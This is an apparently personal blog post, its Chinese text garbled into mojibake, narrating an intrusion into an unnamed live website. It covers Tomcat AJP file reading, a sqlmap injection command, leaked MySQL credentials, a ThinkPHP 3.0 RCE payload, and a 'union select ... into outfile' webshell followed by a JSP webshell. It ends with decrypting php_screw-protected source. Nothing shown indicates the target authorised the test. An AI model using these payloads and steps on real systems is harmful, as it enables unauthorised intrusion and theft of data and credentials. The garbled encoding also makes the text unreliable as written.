---
layout:     post
title:      å¯¹æŸä¸€ç½‘ç«™çš„æ¸—é€æµ‹è¯•
subtitle:   è¿˜æŒºæœ‰æ„æ€çš„ï¼Œæ³¨å…¥->getshell->ææƒ->ç ´è§£phpåŠ å¯†(ç½‘ç«™é˜²æŠ¤åšçš„ã€‚ã€‚)
date:       2020-11-10
author:     BY Diego
header-img: https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/83173792_p0.jpg
tags:
    - æ¸—é€æµ‹è¯•
---



## å¯¹ç½‘ç«™çš„æ¸—é€



ç«¯å£æ‰«æ

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105221640.png)



å­˜åœ¨`mysql`,`ftp`,`ssh`,`http`,`ajp`,`tomcat` å¤šä¸ªæœåŠ¡



ajp å­˜åœ¨æ¼æ´ `2020-10487 Tomcat apj`

å­˜åœ¨ä»»æ„æ–‡ä»¶è¯» ï¼Œä½†æ²¡å•¥ç”¨

`WEB-INF/web.xml` é‡Œæ²¡æœ‰ä»»ä½•ä¸œè¥¿

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110192829.png)



appä¸ŠæŠ“äº†ä¸ªåŒ…ï¼Œå‘ç°äº†æ¯”è¾ƒå¯ä»¥çš„api

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105224537.png)



å¯¹`name`è¿›è¡Œæ³¨å…¥ï¼Œ è¾“å…¥`"||1||"` è¿”å›æ­£å¸¸æ•°æ® ï¼Œä½†æ— æ³•æ³¨é‡Šåé¢çš„å†…å®¹ï¼Œåªèƒ½`å¸ƒå°”æ³¨å…¥`

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105224905.png)



sqlmap ä¸€æŠŠæ¢­

`python .\sqlmap.py -r res --tamper=space2comment --level 5  --dbs --random-agent`

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105225413.png)



å­˜åœ¨è¯»æ–‡ä»¶

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105225708.png)



ä¸çŸ¥é“`nginx` å’Œ `webç›®å½•`,é»˜è®¤è·¯å¾„ä¸å­˜åœ¨

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105230233.png)



è¯»åˆ°mysqlçš„ç›®å½•ï¼Œæ ¹æ®å¤§ä½¬çš„çŒœæµ‹ï¼ŒåŒç›®å½•ä¸‹å­˜åœ¨nginx æœåŠ¡ï¼Œäºæ˜¯è¯»å–`***/nginx/conf/nignx.conf`

æˆåŠŸè¯»åˆ°é…ç½®æ–‡ä»¶, å­˜åœ¨å¤šä¸ªåº”ç”¨ ä»¥åŠå¯¹åº”çš„è·¯å¾„

```
        location /** {
                autoindex on;
               root /***/***/******;
               index index.html index.htm index.php;
                if (!-e $request_filename) {
                        rewrite ^/xx/(.*)$ /xxxx/admin.php/$1 last;

        break;
                }
        }

        location = /xxx {
               #autoindex on;
               root /xxx/xxx/xxxx;
               index index.html index.htm index.php;
                if (!-e $request_filename) {
                        rewrite ^/xx /xx/index.php last;
                        break;
                }
        }
```



ä¸¤ä¸ªåå°ï¼ˆå…¶ä¸­ä¸€ä¸ªè¿˜æŒ‚äº†ï¼‰ï¼Œå’Œä¸€ä¸ªåº”ç”¨

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20201105231205660.png)



æš´éœ²äº† æ¡†æ¶å’Œç»å¯¹è·¯å¾„

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105231357.png)

å­˜åœ¨ç›®å½•éå†ï¼Œå‘ç°äº†ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡µé¢`mysql.inc.php`ï¼Œè¯»å–è·å–äº† mysql çš„è´¦å·å¯†ç 

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110204448.png)



ä¼å›¾ç›´æ¥è¿æ¥ï¼Œä½†å¤±è´¥äº†ï¼Œ

çœ‹äº†çœ‹æ•°æ®åº“ï¼Œåªèƒ½æœ¬åœ°ç™»å½•å’ŒæŒ‡å®šipç™»å½•

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110204922.png)





ç„¶åå‘ç°æ˜¯`tp3.0`çš„è¿œå¤æ¡†æ¶ ï¼Œæ ¹æ®æ¡†æ¶è¯»äº†ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯å…¥å¯æ–‡ä»¶index.php)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110202818.png)



æŒ‰ç…§è¿™ä¸ªé…ç½®æ–‡ä»¶æœ¬æ­å»ºäº†ä¸€ä¸‹ï¼Œç›®å½•ç»“æ„æ¸…æ™°å¯è§

```
â”œâ”€caches
â”‚  â”œâ”€cache
â”‚  â”œâ”€data
â”‚  â”œâ”€logs
â”‚  â””â”€temp
â”œâ”€common
â”œâ”€Conf
â”œâ”€language
â”œâ”€library
â”‚  â”œâ”€Action
â”‚  â”œâ”€****
â”‚  â”œâ”€Model
â”‚  â””â”€****
â””â”€themes
```



æ ¹æ®æ‰‹å†Œ `tp3`çš„ç¼–ç¨‹é£æ ¼ï¼Œç¡®å®š é¡¹ç›®çš„æ–‡ä»¶ä¸º`IndexAction.class.php`ï¼Œé€šè¿‡sqlæ³¨å…¥è¯»å–å‘ç°ä¹±ç ã€‚ã€‚ã€‚

ç„¶åå°è¯•`tp3.0`çš„RCE

pocå¦‚ä¸‹

```
http://**/index.php/Index/index/name/$%7B@phpinfo%28%29%7D
```

ç›´æ¥æ‰“ä¸è¡Œ

ä»”ç»†çœ‹äº†ä¸€ä¸‹ å‘ç°å¿…é¡»ä¸ºç²¾ç®€æ¨¡å¼ä¸‹æ‰å¯ä»¥ä½¿ç”¨,å³index.phpå¾—åŒ…å«å¦‚ä¸‹

```php
define('MODE_NAME','Lite');
```



æœªæœ æƒ³èµ·è¿˜æœ‰ç®¡ç†çš„è´¦å·å¯†ç 

é€šè¿‡ä¹‹å‰æ³¨å…¥æ‹¿åˆ°æ•°æ®åº“ï¼Œæ‰¾åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œç„¶åç™»å…¥ï¼ˆåå°æœ‰ç‚¹ä¸œè¥¿

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105231738.png)



åå°åŒæ ·å­˜åœ¨æ³¨å…¥æ¼æ´ï¼ˆéšä¾¿ä¸€ä¸ªåœ°æ–¹å°±æœ‰ï¼‰ï¼Œå¹¶å­˜åœ¨ è”åˆæ³¨å…¥ï¼Œå¹¶ä¸”å…·æœ‰å†™æ–‡ä»¶æƒé™

```SQL
0 union select tohex('webshell'),1,2 into outfile '/**/**/**/shell.php'
```



èšå‰‘è¿æ¥ä¸Š

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20201105232648033.png)



ä½†è‡ªå·±æ˜¯ wwwç”¨æˆ·

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201105232727.png)



æŸ¥çœ‹è¿›ç¨‹

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201106002356.png)

å‘ç°rootå¯åŠ¨çš„ tomcat

å°è¯•å¾€tomcat å†™ jspé©¬

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201106002609.png)



ä½†æ˜¯æ²¡æœ‰å†™æƒé™

åœ¨æ£€ç´¢å¯æ“ä½œæ–‡ä»¶æ—¶ï¼Œå­˜åœ¨æ‰€æœ‰æœåŠ¡çš„ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶å¤¹

å‘ç°tomcatæ—¥å¿—å¯è¯»ï¼ˆå¿ƒæƒ³ tomcatä¸æ˜¯ä¸ªç©ºå£³æ¥ç€ï¼Œæ€ä¹ˆè¿˜æœ‰æ—¥å¿—

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201106002957.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201106002909.png)



çœ‹æ—¥å¿—æ‰å‘ç°è¿˜è¿è¡ŒæœåŠ¡

æ£€ç´¢å¯¹åº”æ–‡ä»¶

å‘ç°åœ¨tomcatå¤–çš„ç›®å½• éƒ¨ç½²äº†æœåŠ¡å¹¶è¿è¡Œåœ¨8080ä¸Šï¼Œä¸”å±æ€§ä½777ï¼Œå†™ä¸ªjspé©¬

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201106003150.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201106003327.png)



çœ‹äº†çœ‹æºç  ï¼ˆè’™ğŸ–Š æ€ªä¸å¾—æ˜¯ä¹±ç 

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110195813.png)



æ ¹æ®`PM9SCREW` æ£€ç´¢äº†ä¸€ä¸‹ æ˜¯`screw` åŠ å¯†

æ ¹æ®æ•™ç¨‹å…ˆè·å– ç¼–è¯‘å¥½çš„`php_screw.so` æ–‡ä»¶

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110200225.png)



ä¸‹è½½ä¸‹æ¥æ‹–åˆ°`IDA`

æ‰¾åˆ°`_pm9screw_ext_fopen` åŠ å¯†å‡½æ•°

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110200324.png)



f5

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110200413.png)



è·Ÿè¿›



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110200443.png)





è¿›å…¥çº¢è‰²éƒ¨åˆ†å‘ç°`key`ï¼ˆæ‰“ç éƒ¨åˆ†



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110200528.png)





å¯¼å‡º

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110200645.png)



ç„¶åç”¨

`https://github.com/firebroo/screw_decode` è¿›è¡Œè§£å¯†



å…‹éš†ä¸‹æ¥ ä¿®æ”¹`screwdecode.c`

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110200934.png)



ç„¶åç¼–è¯‘`make`

`./decode ./xx.php`

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110201058.png)



è§£å¯†å®Œæˆ

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201110201214.png)

